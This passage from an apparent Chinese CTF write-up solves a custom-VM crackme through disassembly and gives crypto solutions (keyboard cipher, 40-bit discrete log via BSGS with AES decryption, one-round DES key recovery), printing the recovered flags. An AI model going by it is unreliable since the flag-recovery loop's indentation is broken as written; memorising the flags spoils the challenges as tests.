</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">14</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, sub_400FA8<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;ecx&#34;</span>, cur_arg))
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">15</span>:
</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">^=</span> ebx
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;eax ^= ebx;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">16</span>:
</span></span><span style="display:flex;"><span>        zf <span style="color:#f92672">=</span> (eax <span style="color:#f92672">==</span> ebx)
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;zf = (eax == ebx);&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">17</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;push(eip+2); eip = </span><span style="color:#e6db74">{</span>hex(cur_arg)<span style="color:#e6db74">}</span><span style="color:#e6db74">;&#34;</span>)
</span></span><span style="display:flex;"><span>        memory[edx] <span style="color:#f92672">=</span> eip
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">18</span>:
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;pop(eip);&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">19</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;eip = </span><span style="color:#e6db74">{</span>hex(cur_arg)<span style="color:#e6db74">}</span><span style="color:#e6db74">;&#34;</span>)
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">20</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;if zf:    eip = </span><span style="color:#e6db74">{</span>hex(cur_arg)<span style="color:#e6db74">}</span><span style="color:#e6db74">;&#34;</span>)
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">21</span>:
</span></span><span style="display:flex;"><span>        memory[edx] <span style="color:#f92672">=</span> memory2[ecx]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;push(memory2[ecx]);&#34;</span>)
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">22</span>:
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        memory2[ecx] <span style="color:#f92672">=</span> memory[edx]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;pop(memory2[ecx]);&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">23</span>:
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">&#34;break;&#34;</span>)
</span></span><span style="display:flex;"><span>    eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>拿到反汇编结果</p>
<pre tabindex="0"><code>_00: push(eip+2); eip = 0x34;
_02: push(42);
_04: pop(ebx);
_05: zf = (eax == ebx);
_06: if zf:    eip = 0x9;
_08: break;
_09: push(36);
_0B: pop(ebx);
_0C: push(ecx);
_0D: push(eip+2); eip = 0x1d;
_0F: pop(ecx);
_10: push(0);
_12: pop(ebx);
_13: push(ecx);
_14: push(eip+2); eip = 0x40;
_16: pop(ecx);
_17: push(72);
_19: pop(ebx);
_1A: push(eip+2); eip = 0x1d;
_1C: break;
_1D: ecx -= 1;
_1F: push(memory2[ecx]);
_20: pop(eax);
_21: eax ^= ebx;
_22: push(eax);
_23: pop(memory2[ecx]);
_24: push(ebx);
_25: push(0);
_27: pop(eax);
_28: push(ecx);
_29: pop(ebx);
_2A: zf = (eax == ebx);
_2B: if zf:    eip = 0x32;
_2D: pop(ebx);
_2E: ebx += 2;
_30: eip = 0x1d;
_32: pop(ebx);
_33: pop(eip);
_34: push(memory2[ecx]);
_35: pop(eax);
_36: zf = (eax == ebx);
_37: if zf:    eip = 0x3d;
_39: ecx += 1;
_3B: eip = 0x34;
_3D: push(ecx);
_3E: pop(eax);
_3F: pop(eip);
_40: ecx -= 1;
_42: push(memory2[ecx]);
_43: pop(eax);
_44: eax += ebx;
_45: push(eax);
_46: pop(memory2[ecx]);
_47: push(ebx);
_48: push(0);
_4A: pop(eax);
_4B: push(ecx);
_4C: pop(ebx);
_4D: zf = (eax == ebx);
_4E: if zf:    eip = 0x55;
_50: pop(ebx);
_51: ebx += 1;
_53: eip = 0x40;
_55: pop(ebx);
_56: pop(eip);
</code></pre><p>发现其实是调用了几个函数，分别在0x34、0x40、0x1D</p>
<p>0x34处的函数判断了长度，0x1D处的函数从后往前异或数字，每次加2，0x40处的函数从后往前进行加法，数字每次加1</p>
<p>所以最后的加密算法为：首先从后往前 ^36, ^38, ^40，随后从后往前+0, +1, +2&hellip;，最后从后往前 ^72, ^74, ^76&hellip;</p>
<p>反向解密即可</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s2 <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xA3</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0xAC</span>, <span style="color:#ae81ff">0xA9</span>, <span style="color:#ae81ff">0xA8</span>, <span style="color:#ae81ff">0xD6</span>, <span style="color:#ae81ff">0xA6</span>, <span style="color:#ae81ff">0xCD</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0xD5</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xB7</span>, <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0xB3</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x2D</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x4B</span>, <span style="color:#ae81ff">0x3A</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xFD</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0x78</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x2D</span>, <span style="color:#ae81ff">0xD9</span>, <span style="color:#ae81ff">0x3D</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x1F</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x47</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x11</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> <span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span>y <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>z <span style="color:#f92672">=</span> <span style="color:#ae81ff">72</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> s2[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">+=</span> chr(((i <span style="color:#f92672">^</span> z) <span style="color:#f92672">-</span> y) <span style="color:#f92672">^</span> x)
</span></span><span style="display:flex;"><span>        x <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        y <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        z <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print (flag[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#39;flag{Now_Y0u_Know_th4_Signa1_0f_Linux!!!!}&#39;</span>
</span></span></code></pre></div><h2 id="crypto">Crypto</h2>
<h3 id="萌新素数">[萌新]素数</h3>
<p>使用gmpy2生成10个大素数，然后依次提交即可</p>
<h3 id="签到键盘侠">[签到]键盘侠</h3>
<p>根据题目名称，猜测和键盘有关系</p>
<p>将密文放入键盘的对应位置后，发现一组密文在键盘上构成一个图案，这个图案是一个字母</p>
<p>比如UYTGBNM在键盘上组成一个C，同样的方式和可以还原出其他字母</p>
<h3 id="silent_peeper">silent_peeper</h3>
<p>离散对数，考虑幂只有40bit，用BSGS即可解出答案。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sage: p <span style="color:#f92672">=</span> <span style="color:#ae81ff">17480715736546509273132356167852223654917350291331787539356496312333028105252468745075491024000992015452563532</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">....</span>: <span style="color:#ae81ff">520952698743383378549938420481917954954410649849158983419586000890687503941868419125253760412312965974672161440234</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">....</span>: <span style="color:#ae81ff">6449135195832955793815709136053198207712511838753919608894095907732099313139446299843</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">....</span>: g <span style="color:#f92672">=</span> <span style="color:#ae81ff">41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">....</span>: <span style="color:#ae81ff">185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">....</span>: <span style="color:#ae81ff">973332463469104730271236078593527144954324116802080620822212777139186990364810367977</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">....</span>:
</span></span><span style="display:flex;"><span>sage: bsgs(mod(g,p),mod(A,p),(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">40</span>))
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">822690494337</span>
</span></span><span style="display:flex;"><span>sage: bsgs(mod(g,p),mod(B,p),(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">40</span>))
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">621209248538</span>
</span></span><span style="display:flex;"><span>sage: key <span style="color:#f92672">=</span> pow(A, <span style="color:#ae81ff">621209248538</span> ,p)
</span></span><span style="display:flex;"><span>sage: key
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49490143664250726340234715933627573928019204778410313862054713655398194526581099674219755475997125892095025977920719640048704962181220475413665581922989858463397985369540020911109237604500080688916224884254427061443849735076051958183562833019840975221087968773423237208708556105725003184929141476854095400756</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> ciphertext <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> key <span style="color:#f92672">=</span> <span style="color:#ae81ff">49490143664250726340234715933627573928019204778410313862054713655398194526581099674219755475997125892095025977920719640048704962181220475413665581922989858463397985369540020911109237604500080688916224884254427061443849735076051958183562833019840975221087968773423237208708556105725003184929141476854095400756</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> key <span style="color:#f92672">=</span> long_to_bytes(key)[:<span style="color:#ae81ff">16</span>]
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_ECB)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> cipher<span style="color:#f92672">.</span>decrypt(int<span style="color:#f92672">.</span>to_bytes(ciphertext, ciphertext<span style="color:#f92672">.</span>bit_length()<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;big&#39;</span>))
</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag{21384433-0dc7-413b-9d09-64cc97c99730}</span><span style="color:#ae81ff">\x06\x06\x06\x06\x06\x06</span><span style="color:#e6db74">&#39;</span>
</span></span></code></pre></div><h3 id="ezdes">EzDES</h3>
<p>题目是个DES一轮差分，有数学公式: $ L_1=R_0,R_1=L_0\oplus f(R_0,K_0) $，其中L1R1,L0R0都是已知量，只需要逆推到s盒附近，通过s盒的结果爆破s盒的输入即可，有65536种可能，然后用剩下几个明密文对验证，排除出剩一种结果。主要代码如下(请将S盒，IP盒等内容分别命名为IP_1.txt，sbox.txt等放入文件src子目录下，详情见代码)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#########################################################################</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get roundKey</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#########################################################################</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the move number</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getMoveNum</span>():
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">or</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">15</span>:
</span></span><span style="display:flex;"><span>            res[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            res[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the PC_1 table and PC_2 table</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getPC</span>():
</span></span><span style="display:flex;"><span>    PC_1_str <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./src/PC_1.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    PC_2_str <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./src/PC_2.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    PC_1 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> len(PC_1_str)
</span></span><span style="display:flex;"><span>    PC_2 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> len(PC_2_str)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(PC_1_str)):
</span></span><span style="display:flex;"><span>        PC_1[i] <span style="color:#f92672">=</span> int(PC_1_str[i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(PC_2_str)):
</span></span><span style="display:flex;"><span>        PC_2[i] <span style="color:#f92672">=</span> int(PC_2_str[i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> PC_1, PC_2
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cyclic shift to the left</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leftRow</span>(arr, n):
</span></span><span style="display:flex;"><span>    temp <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> n
</span></span><span style="display:flex;"><span>    length <span style="color:#f92672">=</span> len(arr)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>        temp[i] <span style="color:#f92672">=</span> arr[i]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&lt;</span> length <span style="color:#f92672">-</span> n:
</span></span><span style="display:flex;"><span>            arr[i] <span style="color:#f92672">=</span> arr[i <span style="color:#f92672">+</span> n]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            arr[i] <span style="color:#f92672">=</span> temp[i <span style="color:#f92672">-</span> length <span style="color:#f92672">+</span> n]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> arr
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the k0 - k16</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">genKey</span>(key):
</span></span><span style="display:flex;"><span>    C <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>    D <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>    K <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span>
</span></span><span style="display:flex;"><span>    roundKey <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">48</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>)]
</span></span><span style="display:flex;"><span>    PC_1, PC_2 <span style="color:#f92672">=</span> getPC()
</span></span><span style="display:flex;"><span>    moveNum <span style="color:#f92672">=</span> getMoveNum()
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># get K+</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">56</span>):
</span></span><span style="display:flex;"><span>        K[i] <span style="color:#f92672">=</span> key[PC_1[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># get C0 and D0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">28</span>):
</span></span><span style="display:flex;"><span>        C[i] <span style="color:#f92672">=</span> K[i]
</span></span><span style="display:flex;"><span>        D[i] <span style="color:#f92672">=</span> K[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">28</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># get roundKey</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>        C <span style="color:#f92672">=</span> leftRow(C, moveNum[i])
</span></span><span style="display:flex;"><span>        D <span style="color:#f92672">=</span> leftRow(D, moveNum[i])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">48</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> PC_2[j] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">28</span>:
</span></span><span style="display:flex;"><span>                roundKey[i][j] <span style="color:#f92672">=</span> C[PC_2[j] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                roundKey[i][j] <span style="color:#f92672">=</span> D[PC_2[j] <span style="color:#f92672">-</span> <span style="color:#ae81ff">28</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> roundKey
</span></span><span style="display:flex;"><span><span style="color:#75715e">#########################################################################</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encrypt and Decrypt</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#########################################################################</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#get the IP and PC_1 table</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getIP</span>():
</span></span><span style="display:flex;"><span>    IP_str <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./src/IP.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    IP_1_str <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./src/IP_1.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    IP <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> len(IP_str)
</span></span><span style="display:flex;"><span>    IP_1 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> len(IP_1_str)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(IP_str)):
</span></span><span style="display:flex;"><span>        IP[i] <span style="color:#f92672">=</span> int(IP_str[i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(IP_1_str)):
</span></span><span style="display:flex;"><span>        IP_1[i] <span style="color:#f92672">=</span> int(IP_1_str[i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> IP, IP_1
</span></span><span style="display:flex;"><span><span style="color:#75715e"># l1 xor l2</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(l1, l2):
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> len(l1)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(l1)):
</span></span><span style="display:flex;"><span>        res[i] <span style="color:#f92672">=</span> l1[i] <span style="color:#f92672">^</span> l2[i]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the Extend table</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getE</span>():
</span></span><span style="display:flex;"><span>    E_str <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./src/extend.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    E <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> len(E_str)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(E_str)):
</span></span><span style="display:flex;"><span>        E[i] <span style="color:#f92672">=</span> int(E_str[i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> E
</span></span><span style="display:flex;"><span><span style="color:#75715e"># extend R from 32 bit to 48 bit</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extend</span>(R):
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>    E <span style="color:#f92672">=</span> getE()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">48</span>):
</span></span><span style="display:flex;"><span>        res[i] <span style="color:#f92672">=</span> R[E[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
